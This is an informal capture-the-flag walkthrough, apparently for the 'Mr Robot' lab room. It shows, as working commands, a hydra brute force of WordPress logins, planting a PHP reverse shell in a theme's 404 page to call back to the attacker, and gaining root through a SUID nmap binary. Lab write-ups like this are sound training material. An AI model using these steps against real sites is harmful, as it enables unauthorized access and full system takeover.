i visited the website on port 80 and by the help of an extention in firefox (wappalyzer) i came to know that website is using wordpress 4.3.1

after that i did a gobuster scan


gobuster dir -u http://10.10.241.103 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,php,html -t 100

gobuster gave alot of directories i found blog to be useful
saw robots.txt and found 2 files

User-agent: *
fsocity.dic
key-1-of-3.txt

downloaded both of them


after this i went to the /blog directory and found out this page isnt accisible so as this is a wordpress website i tried to
visit the page wp-login.php

and yes i llanded to the login page of the website! now i

and i tried to login using admin admin

but that didnt worked ! idk how though of using elliot as the user as i have searched for mr robot on google when i started this room!
and saw Elliot is the main protagonist! after that!

i tried to login in Elliot username and password admin

this time this showed that Elliot username is correct and admin pass is wrong
i though of using the wordlist i got on robots.txt fsociety.dic

and used hydra to crack it

but before that we  have to capture the loginn request the webserver is making to autheticate the user! you can do this simply by 
going to the network section of the developers tool and and copying the request

this was the request

log=elliot&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2Frobot.thm%2Fwp-admin%2F&testcookie=1

so the hydra command was lke this

hydra -l Elliot -P fsociety.dic  $IP http-post-form “/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Frobot.thm%2Fwp-admin%2F&testcookie=1:S=302” -f -Vv -t63



after this i waited for sometime but havent got anything good after one hour so decided to see the results!

one thing i noticed is some passwords are repeating so i decided to sort the wordlist first

wc -l wordlist   <--- number of lines in wl
sort wordlist > newwordlist.txt     <---- this will sort the wordlist and araange all the words properly
uniq newwordlist.txt > newsort.txt    <---- this will give you a wordlist with only unique words

now again use hydra to crack the password it will work this time password :  ER28-0652

after loggin in we have to upload a payload it in! the most common way is to edit the page 404 page and upload a rev shell 

i did that go to appearance and the edit and the edit the error404.php page with you rev shell payload written in php 
you can download it from

https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

change the ip to tun0 and port 

now just try to visit any page one the website that isnt indexed on the website sile

http://$ip/blog/aasda

and dont forget to turn on the nc rev listener on other terminal

this will give you a rev connection and now you have the shell in website

python3 -c 'import pty; pty.spawn("/bin/bash")'


use this command to stabalize the shell! now i searched for the suid files


$ find / -type f -perm -u=s 2>/dev/null


/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign


now you can see there is binary named nmap which have suid perms i visited gtfobins and tired to use the suid perms commands given there but it didnt worked idk why! 


then i read the hint for root user i got  nmap 

so i looked for priv esc using nmap and got that! 

nmap version 3.81  is vulnerable and we can chnage to root user ! when given suid perms to nmap

/usr/local/bin/nmap --interactive
!sh

this will change the user to root!


and now we are root user! cheers!
